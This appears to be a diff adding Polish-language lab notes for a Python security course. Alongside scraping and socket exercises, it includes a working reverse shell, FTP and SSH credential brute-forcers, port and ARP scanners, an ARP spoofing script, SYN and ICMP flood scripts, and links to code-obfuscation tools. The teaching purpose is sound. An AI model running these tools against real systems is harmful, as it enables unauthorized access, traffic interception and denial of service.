+for search in html_page.find_all("a"):
+    try:
+        link = search.get("href")
+        if not link.startswith("https:"):
+            link = site + link
+        print(link)
+    except:
+        print("Błąd")
+
+***
+
+extractingdata.py
+
+import requests
+from bs4 import BeautifulSoup
+
+site = "https://kcir.pwr.edu.pl/~mucha/Robotyka_prezentacja/"
+
+res = requests.get(site)
+soup = BeautifulSoup(res.text, 'html.parser')
+
+for search in soup.find_all('a'):
+    link = search.get('href')
+    if link.endswith(".pdf"):
+        if not link.startswith("https://"):
+            link = site + link
+        pdf_name = link.split("/")[-1]
+        pdf_file = requests.get(link, stream=True)
+        with open(pdf_name, "wb") as f:
+            f.write(pdf_file.content)
+
+***
+
+Instalacja requests-html
+
+    pip install requests-html
+
+
+***
+
+requestshtmloverview.py
+
+from requests_html import HTMLSession
+
+session = HTMLSession()
+
+res = session.get("https://www.google.com/search?q=cats")
+links = res.html.links
+
+for link in links:
+    if link.startswith('https'):
+        print(link)
+
+***
+
+### 📋 – Lab04 Content Extraction
+
+import requests
+from bs4 import BeautifulSoup
+
+site = "http://scanme.nmap.org"
+
+res = requests.get(site)
+soup = BeautifulSoup(res.text, "html.parser")
+for line in soup.find_all("a"):
+    link = line.get("href")
+    if not link.startswith("http://") and not link.startswith("https://"):
+        link = site + link
+    print(link)
+
+***
+
+Wyświetlenie wszystkich plików tekstowych (.js)
+
+import requests
+from bs4 import BeautifulSoup
+
+res = requests.get("https://www.hackthissite.org")
+soup = BeautifulSoup(res.text, "html.parser")
+
+print("Wszystkie pliki JS")
+
+for line in soup.find_all("script"):
+    link = line.get("src")
+    if str(link).endswith(".js"):
+        print(link)
+
+***
+
+### 📋 – Lab05 Home Project
+
+🏠 Homework
+
+***
+
+### 📋 – TDX ARENA - FireFlies
+
+🏠 Homework
+
+***
+
+[Socket Fundamentals]
+
+Instalacja pycharm na Kali Linux:
+
+Instrukcja: https://www.jetbrains.com/help/pycharm/installation-guide.html
+Pobieranie Community: https://www.jetbrains.com/pycharm/download/#section=linux
+Komenda na rozpakowanie: sudo tar xzf pycharm-*.tar.gz -C /opt/
+Komenda na przeskoczenie: cd /opt/pycharm-community-2022.3/bin
+Run: sh pycharm.sh
+
+Instalacja Chocolatey
+
+Instrukcja: https://chocolatey.org/install
+Netcat: choco install netcat
+
+***
+
+### 📋 – Lab06 Echo Communication (Client Socket)
+
+clientsocket.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.connect(("127.0.0.1", 4444))
+mysocket.close()
+
+***
+
+### 📋 – Lab07 Test Communication (Server Socket)
+
+serversocket.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.bind(("0.0.0.0", 4444))
+mysocket.listen(1)
+conn, addr = mysocket.accept()
+mysocket.close()
+
+***
+
+clientsocket1.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.connect(("127.0.0.1", 4444))
+mysocket.send("Hello!".encode())
+print("Wysłano!")
+mysocket.close()
+
+serversocket1.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.bind(("0.0.0.0", 4444))
+mysocket.listen(1)
+conn, addr = mysocket.accept()
+data = conn.recv(2048).decode()
+print(data)
+mysocket.close()
+
+***
+
+🔗 -- Python Reference
+https://python-reference.readthedocs.io/en/latest/docs/str/encode.html
+
+***
+
+### 📋 – Lab08 Test Communication (Large Data)
+
+clientsocket2.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.connect(("127.0.0.1", 4444))
+data = mysocket.recv(2048).decode()
+print(data)
+mysocket.close()
+
+serversocket2.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.bind(("0.0.0.0", 4444))
+mysocket.listen(1)
+conn, addr = mysocket.accept()
+conn.send("Hello!".encode())
+print("Wysłane!")
+mysocket.close()
+
+***
+
+serversocketlargedata.py
+
+import socket
+
+data = b""
+buffer = 2048
+
+mysocket = socket.socket()
+mysocket.bind(("0.0.0.0", 4444))
+mysocket.listen(1)
+conn, addr = mysocket.accept()
+
+while True:
+    packet = conn.recv(buffer)
+    print(len(packet))
+    data += packet
+    if len(packet) < buffer:
+        print("All data!")
+        break
+mysocket.close()
+
+with open("output.txt", "wb") as f:
+    f.write(data)
+
+clientsocketlargedata.py
+
+import socket
+
+data = """
+DATA
+"""
+
+mysocket = socket.socket()
+mysocket.connect(("127.0.0.1", 4444))
+mysocket.send(data.encode())
+mysocket.close()
+
+***
+
+### 📋 – Lab09 Echo Communication
+
+server.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.bind(("0.0.0.0", 4444))
+mysocket.listen(1)
+conn, addr = mysocket.accept()
+
+while True:
+    try:
+        server_message = input("Wiadomość dla klienta: ")
+        conn.send(server_message.encode())
+        client_message = conn.recv(2048).decode()
+        if server_message == "exit" or client_message == "exit":
+            print("Zamykamy!")
+            break
+        else:
+            print("Wiadomość od klienta: " + client_message)
+    except:
+        print("Problem z połączeniem")
+
+mysocket.close()
+
+client.py
+
+import socket
+
+mysocket = socket.socket()
+mysocket.connect(("127.0.0.1", 4444))
+
+while True:
+    try:
+        server_message = mysocket.recv(2048).decode()
+        print("Wiadomość od serwera: " + server_message)
+        client_message = input("Wiadomość do serwera: ")
+        mysocket.send(client_message.encode())
+
+        if client_message == "exit" or server_message == "exit":
+            print("Zamykamy to połączenie")
+            break
+    except:
+        print("Problem z połączeniem")
+
+mysocket.close()
+
+***
+
+### 📋 – Lab10 Echo Communication (Reverse Shell)
+
+server.py
+
+import socket
+
+srv_host = "0.0.0.0"
+srv_port = 4445
+buff_size = 2048
+
+mysocket = socket.socket()
+mysocket.bind((srv_host, srv_port))
+mysocket.listen(1)
+print(f'Listening as {srv_host}:{srv_port}...')
+
+conn, addr = mysocket.accept()
+print(f"{addr[0]}:{addr[1]} connected")
+
+while True:
+    command = input("Enter a command: ")
+    conn.send(command.encode())
+    if command.lower() == "exit":
+        break
+    results = conn.recv(buff_size).decode()
+    print(results)
+
+conn.close()
+mysocket.close()
+
+
+client.py
+
+import socket
+import subprocess
+
+srv_host = "127.0.0.1"
+srv_port = 4445
+buff_size = 2048
+
+mysocket = socket.socket()
+mysocket.connect((srv_host, srv_port))
+
+while True:
+    try:
+        command = mysocket.recv(buff_size).decode().lower()
+        command = command.split()
+
+        print(command)
+
+        if "exit" in command:
+            break
+
+        output = subprocess.check_output(command, shell=True)
+        mysocket.send(output)
+    except:
+        continue
+
+mysocket.close()
+
+***
+
+📅 14.01.2023 🕘 [09:00]
+
+Wykładowca: Mateusz Dudziak
+
+Global Python Programming For Security
+
+Chapter 4 Protocol Communication and Scapy & Network Scanning 
+= - = - = - = - = - = - =  - = - = - = - = - = - = - = - = - 
+
+🔗 -- Instrukcja instalacji programu Pycharm w środowisku Linux: https://www.jetbrains.com/help/pycharm/installation-guide.html
+
+🔗 -- PyCharm - Download link
+https://www.jetbrains.com/pycharm/download/#section=linux
+
+mkdir pycharm
+sudo tar xzf pycharm-*.tar.gz -C /home/kali/pycharm/
+cd ../pycharm
+sudo /home/kali/pycharm/pycharm-community-2022.3.1/bin/pycharm.sh
+
+***
+
+[Protocol Communication]
+
+### 📋 – Lab01 Banner Grabber
+
+Uruchomienie serwera apache2
+
+systemctl start apache2
+
+lab1.py
+
+import socket
+
+while True:
+    try:
+        targetIP = input("Podaj adres IP: ")
+        targetPort = input("Podaj port: ")
+
+        if targetIP == "exit" or targetPort == "exit":
+            break
+
+        mySocket = socket.socket()
+        mySocket.connect((targetIP, int(targetPort)))
+
+        #mySocket.send("Get Banner \r\n".encode())
+
+        server_r = mySocket.recv(2048).decode()
+
+        print(f"Port {targetPort}\n\nService {server_r}")
+
+        mySocket.close()
+    except:
+        continue
+
+***
+
+🔗 -- FILE TRANSFER PROTOCOL (FTP)
+https://www.ietf.org/rfc/rfc959.txt
+
+Instalacja i uruchomienie serwisu ftp
+
+sudo apt install -y vsftpd
+systemctl start vsftpd
+
+ftpconnection.py
+
+import ftplib
+
+try:
+    targetIP = input("Podaj adres IP: ")
+    ftpServer = ftplib.FTP()
+    ftpServer.connect(targetIP, 21, timeout=2)
+
+    username = input("Wprowadz login: ")
+    password = input("Wprowadz haslo: ")
+
+    ftpServer.login(username, password)
+    print(f"Connected to {targetIP}!")
+
+    ftpServer.dir()
+except Exception as error:
+    print(error)
+
+***
+
+### 📋 – Lab02 FTP Automation
+
+W przygotowaniu do zadania należy utworzyć dwa pliki tekstowe:
+username, password zawierające prawidłowe dane logowania kali:kali
+
+Plik do uploadu data > Text (musi znajdować się w katalogu projektu)
+Plik do downloadu data_from_server > TextText (musi znajdować się na serwerze)
+
+lab2.py
+
+import ftplib
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+targetIP = input("Wprowadz adres IP: ")
+users_file = open("username", "r")
+passwords_file = open("password", "r")
+
+ftpServer = ftplib.FTP()
+
+usernames = users_file.read().split("\n")
+passwords = passwords_file.read().split("\n")
+
+for username in usernames:
+    for password in passwords:
+        print(f'Trying {username}:{password}')
+        try:
+            ftpServer.connect(targetIP, 21, timeout=1)
+        except Exception as error:
+            print("No connection to server!")
+            exit()
+
+        try:
+            ftpServer.login(username, password)
+        except:
+            print(bcolors.FAIL + "[-] Invalid credentials!" + bcolors.ENDC)
+            continue
+
+        print(bcolors.OKGREEN + "[+] Udane logowanie! User: " + username + " | Paasword: " + password + bcolors.ENDC)
+
+        ftpServer.storbinary("STOR " + "data", open("data", "rb"))
+        print("File has been stored!")
+
+        ftpServer.retrbinary("RETR " + "data_from_server", open("data_from_server", "wb").write)
+        print("File has been downloaded!")
+
+        ftpServer.quit()
+
+users_file.close()
+passwords_file.close()
+
+***
+
+Uruchomienie serwisu SSH
+
+systemctl start ssh
+
+***
+
+### 📋 – Lab03 SSH Mapping
+
+Instalacja Paramiko:
+
+    W dolnym pasku wybrać terminal i tam wpisać:
+
+    pip install paramiko
+
+
+lab3.py
+
+import paramiko
+
+targetIP = input("Podaj IP: ")
+targetPort = 22
+username = input("Podaj login: ")
+password = input("Podaj haslo: ")
+command = "ls -la"
+
+SSH = paramiko.SSHClient()
+SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+SSH.load_system_host_keys()
+
+try:
+    SSH.connect(targetIP, targetPort, username, password)
+except paramiko.ssh_exception.NoValidConnectionsError:
+    print("Połączenie nieudane")
+    exit()
+except paramiko.ssh_exception.AuthenticationException:
+    print("Nieprawidłowe dane logowania")
+    exit()
+
+stdin, stdout, stderr = SSH.exec_command(command)
+newOutput = stdout.readlines()
+
+print(newOutput)
+
+for line in newOutput:
+    print(line.replace("\n", ""))
+
+SSH.close()
+
+***
+
+### 📋 – Lab04 Bruteforce SSH
+
+import paramiko
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+targetIP = input("Wprowadz adres IP: ")
+users_file = open("username", "r")
+passwords_file = open("password", "r")
+targetPort = 22
+
+usernames = users_file.read().split("\n")
+passwords = passwords_file.read().split("\n")
+
+SSH = paramiko.SSHClient()
+SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+SSH.load_system_host_keys()
+
+for username in usernames:
+    for password in passwords:
+        print(f"Trying: {username}:{password}")
+        try:
+            SSH.connect(targetIP, targetPort, username, password)
+        except paramiko.ssh_exception.NoValidConnectionsError:
+            print(bcolors.FAIL + "[!] Połączenie nieudane" + bcolors.ENDC)
+            exit()
+        except paramiko.ssh_exception.AuthenticationException:
+            print(bcolors.FAIL + "[-] Invalid credentials!" + bcolors.ENDC)
+            continue
+
+        print(bcolors.OKGREEN + "[+] Udane logowanie! User: " + username + " | Paasword: " + password + bcolors.ENDC)
+
+        while True:
+            cmd = input("Insert a command: ")
+            if cmd == "exit":
+                exit()
+            stdin, stdout, stderr = SSH.exec_command(cmd)
+
+            newOutput = stdout.readlines()
+            for line in newOutput:
+                print(line.replace("\n", ""))
+
+SSH.close()
+users_file.close()
+passwords_file.close()
+
+---------------------------------------------------------------------------------------
+
+[Scapy & Network Scanning]
+
+DontNameMeScapy.py
+
+import scapy.all as scapy
+
+arp_packet = scapy.ARP()
+
+print(arp_packet.show())
+
+
+scapy_sniff.py
+
+import scapy.all as scapy
+
+data = scapy.sniff(iface="eth0", count=8, filter="icmp")
+
+print(data.show())
+
+***
+
+import scapy.all as scapy
+
+data = scapy.sniff(iface="lo", count=8, filter="icmp")
+
+print(data.show())
+
+
+scapy_send.py
+
+import scapy.all as scapy
+
+scapy.send(scapy.IP(dst='127.0.0.1')/scapy.ICMP(), count=8)
+
+
+scapy_pcap.py
+
+import scapy.all as scapy
+
+file = '/home/kali/pcap1.pcapng'
+
+print(scapy.rdpcap(file).show())
+
+
+scapy_sr.py
+
+import scapy.all as scapy
+
+ans, noans = scapy.sr(scapy.IP(dst="8.8.8.8")/scapy.ICMP())
+
+print(ans[0][1].show())
+
+***
+
+import scapy.all as scapy
+
+ans, noans = scapy.srloop(scapy.IP(dst="8.8.8.8")/scapy.ICMP(), count=4)
+
+print(ans[3][1].show())
+
+# Odwołania do adresów źródłowych i docelowych
+print(ans[3][1].src)
+print(ans[3][1].dst)
+
+
+### 📋 – Lab05 Port Scanning with Scapy
+
+from scapy.all import *
+from scapy.layers.inet import IP, TCP
+
+target = "scanme.nmap.org"
+startport = 1
+lastport = 1024
+
+for port in range(startport, lastport):
+    packet = IP(dst=target)/TCP(dport=port, flags="S")
+    response = sr1(packet, verbose=0)
+
+    if response != None:
+        if response.getlayer(TCP).flags == 0x12:
+            print(f'Port {port} is open')
+
+***
+
+### 📋 – Lab06 ARP Scanning with Scapy
+
+from scapy.all import *
+from scapy.layers.l2 import ARP, Ether
+
+for host in range(1, 255):
+    IP = f"192.168.82.{host}"
+
+    arpPacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP)
+
+    response = srp1(arpPacket, timeout=1, verbose=0)
+
+    if response:
+        print(f"IP: {response.psrc}, MAC: {response.hwsrc}")
+
+***
+
+### 📋 – Lab07 ARP Spoofing with Scapy
+
+# Sprawdzanie adresu IP na Win10 w CMD:
+
+    # ipconfig 
+
+# Sprawdzanie tablicy ARP na Win10 w CMD (w czasie ataku widać zmianę adresów MAC):
+
+    # arp -a
+
+
+from scapy.all import *
+from scapy.layers.l2 import ARP
+
+gatewayIP = "192.168.82.205"
+targetIP = "192.168.82.206"
+
+def getMac(ip):
+    resp = sr1(ARP(hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), timeout=10)
+    return resp[ARP].hwsrc
+
+gatewayMAC = getMac(gatewayIP)
+targetMAC = getMac(targetIP)
+
+while True:
+    send(ARP(pdst=gatewayIP, hwdst=gatewayMAC, psrc=targetIP))
+    send(ARP(pdst=targetIP, hwdst=targetMAC, psrc=gatewayIP))
+
+***
+
+### 📋 – Lab08 ARP Flood Attack with Scapy
+
+from scapy.all import *
+from scapy.layers.inet import IP, TCP, ICMP
+
+def synFold(targetIP, targetPort):
+    send(IP(dst=targetIP)/TCP(sport=RandShort(), dport=targetPort, flags="S")/(b"X"*60000), loop=1, verbose=False)
+def icmpFold(targetIP):
+    send(IP(dst=targetIP)/ICMP()/(b"X"*60000), loop=1, verbose=False)
+
+#synFold("127.0.0.1", 80)
+icmpFold("192.168.82.206")
+
+---------------------------------------------------------------------------------------
+Narzędzia do obfuskacji kodu🐱‍👤:
+
+    https://pyob.oxyry.com
+
+    https://github.com/mgeeky/ProtectMyTooling
+
+    https://pyobfuscate.com/pyd
+
+    PyArmor:
+
+    https://pyarmor.readthedocs.io/en/latest/
+
+    https://www.youtube.com/watch?v=irUtnNtknf8
